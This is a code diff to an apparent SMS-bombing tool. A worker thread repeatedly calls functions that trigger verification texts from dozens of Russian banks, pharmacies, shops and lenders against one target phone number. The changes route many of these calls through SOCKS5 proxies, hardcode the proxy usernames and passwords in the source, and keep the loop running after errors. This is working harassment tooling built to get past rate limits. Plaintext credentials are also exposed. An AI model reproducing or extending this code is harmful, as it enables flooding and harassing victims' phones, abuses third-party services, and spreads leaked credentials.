@@ -53,7 +53,7 @@ from services.sushitut71_service import send_sms_to_mybox
 from services.nadodeneg_service import send_sms_to_nadodeneg
 from services.eco_vspishka_service import send_sms_to_eco_vspishka
 from services.pm_ru_service import send_sms_to_pm_ru
-from services.secret_service import send_sms_to_localkitchen
+from services.secret_service import send_sms_to_fudziyama
 from services.trend_reality_service import send_sms_to_trend_reality
 from services.webbankir_service import send_sms_to_webbankir
 from services.srochno_dengi_service import send_sms_to_srochno_dengi
@@ -253,7 +253,8 @@ class SmsServiceThread(threading.Thread):
                     logger.info(f"Waiting for {time_to_wait} seconds before next SMS...")
                     time.sleep(time_to_wait)
             except Exception as e:
-                logger.error(f"Error in service {self.service_id}: {e}")
+                logger.error(f"Error in service {self.service_id}: {e} he go sleep {time_to_wait}")
+                time.sleep(time_to_wait)
 
     def stop(self):
         self.stop_event.set()
@@ -297,25 +298,25 @@ class SmsServiceThread(threading.Thread):
                 case "1":
                     result = send_sms_to_dommalera(formatted_number)
                 case "2":
-                    result = send_sms_to_4lapy(formatted_number)
+                    result = send_sms_to_4lapy(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
                 case "6":
                     result = send_sms_to_beautery(formatted_number)
                 case "4":
                     result = send_sms_to_thai_banki_ru(formatted_number)
                 case "7":
-                    result = send_sms_to_thai_banki_ru(formatted_number)
+                    result = send_sms_to_thai_banki_ru(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
                 case "8":
-                    result = send_sms_to_4lapy(formatted_number)
+                    result = send_sms_to_4lapy(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
                 case "9":
                     result = send_sms_to_obi(formatted_number)
                 case "10":
-                    result = send_sms_to_akbars(formatted_number)
+                    result = send_sms_to_akbars(formatted_number, proxy='socks5h://EBYbFe:bedARGYYMepR@gproxy.site:12754')
                 case "11":
                     result = send_sms_to_aptech(formatted_number)
                 case "12":
                     result = send_sms_to_winelab(formatted_number)
                 case "13":
-                    result = send_sms_to_letai(formatted_number)
+                    result = send_sms_to_letai(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
                 case "14":
                     result = send_sms_to_svoi(formatted_number)
                 case "15":
@@ -323,11 +324,11 @@ class SmsServiceThread(threading.Thread):
                 case "16":
                     result = send_sms_to_ayurveda(formatted_number)
                 case "17":
-                    result = send_sms_to_raiffeisen(formatted_number)
+                    result = send_sms_to_raiffeisen(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
                 case "18":
                     result = send_sms_to_superapteka(formatted_number)
                 case "19":
-                    result = send_sms_to_nfapteka(formatted_number)
+                    result = send_sms_to_nfapteka(formatted_number, proxy='socks5h://EBYbFe:bedARGYYMepR@gproxy.site:12754')
                 case "20":
                     result = send_sms_to_spacesuhi(formatted_number)
                 case "21":
@@ -355,7 +356,7 @@ class SmsServiceThread(threading.Thread):
                 case "32":
                     result = send_sms_to_happywear(formatted_number)
                 case "33":
-                    result = send_sms_to_prime(formatted_number)
+                    result = send_sms_to_prime(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
                 case "34":
                     result = send_sms_to_pluse_insure(formatted_number)
                 case "35":
@@ -375,9 +376,9 @@ class SmsServiceThread(threading.Thread):
                 case "44":
                     result = send_sms_to_pm_ru(formatted_number)
                 case "45":
-                    result = send_sms_to_localkitchen(formatted_number)
+                    result = send_sms_to_fudziyama(formatted_number)
                 case "46":
-                    result = send_sms_to_trend_reality(formatted_number)
+                    result = send_sms_to_trend_reality(formatted_number, proxy='socks5h://EBYbFe:bedARGYYMepR@gproxy.site:12754')
                 case "47":
                     result = send_sms_to_webbankir(formatted_number)
                 case "48":
@@ -385,7 +386,7 @@ class SmsServiceThread(threading.Thread):
                 case "49":
                     result = send_sms_to_4lapy(formatted_number)
                 case "50":
-                    result = send_sms_to_akbars(formatted_number)
+                    result = send_sms_to_akbars(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
                 case "51":
                     result = send_sms_to_aptech(formatted_number)
                 case "52":
@@ -395,11 +396,11 @@ class SmsServiceThread(threading.Thread):
                 case "54":
                     result = send_sms_to_letai(formatted_number)
                 case "55":
-                    result = send_sms_to_prime(formatted_number)
+                    result = send_sms_to_prime(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
                 case "56":
-                    result = send_sms_to_raiffeisen(formatted_number)
+                    result = send_sms_to_raiffeisen(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
                 case "57":
-                    result = send_sms_to_trend_reality(formatted_number)
+                    result = send_sms_to_trend_reality(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
                 case "59":
                     result = send_sms_to_nfapteka(formatted_number)
                 case "60":
@@ -421,25 +422,25 @@ class SmsServiceThread(threading.Thread):
                 case "68":
                     result = send_sms_to_prostoyvopros(formatted_number)
                 case "69":
-                    result = send_sms_to_boostra(formatted_number)
+                    result = send_sms_to_boostra(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
                 case "70":
                     result = send_sms_to_boostra(formatted_number)
                 case "71":
-                    result = send_sms_to_boostra(formatted_number)
+                    result = send_sms_to_boostra(formatted_number, proxy='socks5h://KEsepE:NeuuCsEc3PAb@bproxy.site:12475')
                 case "72":
-                    result = send_sms_to_boostra(formatted_number)
+                    result = send_sms_to_boostra(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
                 case "73":
-                    result = send_sms_to_boostra(formatted_number)
+                    result = send_sms_to_boostra(formatted_number, proxy='socks5h://KEsepE:NeuuCsEc3PAb@bproxy.site:12475')
                 case "74":
                     result = send_sms_to_boostra(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
                 case "75":
-                    result = send_sms_to_boostra(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
+                    result = send_sms_to_boostra(formatted_number, proxy='socks5h://EBYbFe:bedARGYYMepR@gproxy.site:12754')
                 case "76":
-                    result = send_sms_to_boostra(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
+                    result = send_sms_to_boostra(formatted_number, proxy='socks5h://EBYbFe:bedARGYYMepR@gproxy.site:12754')
                 case "77":
                     result = send_sms_to_boostra(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
                 case "78":
-                    result = send_sms_to_boostra(formatted_number, proxy='socks5h://c4ke:Zz123654@bproxy.site:15008')
+                    result = send_sms_to_boostra(formatted_number, proxy='socks5h://EBYbFe:bedARGYYMepR@gproxy.site:12754')
                 case "79":
                     result = send_sms_to_capitalina(formatted_number)
                 case "80":
